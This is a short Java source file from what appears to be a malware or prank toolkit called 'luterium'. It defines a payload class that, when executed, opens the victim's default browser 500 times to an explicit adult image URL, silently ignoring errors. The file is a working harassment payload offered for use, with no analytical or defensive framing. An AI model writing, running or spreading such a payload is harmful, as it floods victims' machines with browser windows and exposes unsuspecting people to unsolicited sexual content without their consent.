package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;

import java.awt.*;
import java.net.URI;

/**
 * @author Peter
 * @since 10/16/2022
 * Yeah.
 */

public class FurryPorn implements PayloadExecutor {
    @Override
    public void execute() throws Exception {
        for(int i = 0; i < 500; i++) {
            try {
                Desktop.getDesktop().browse(URI.create("https://static1.e621.net/data/sample/93/68/9368cca139a855bd2d1322fab98d84e8.jpg"));
            }
            catch (Exception exception) {}
        }
    }
}
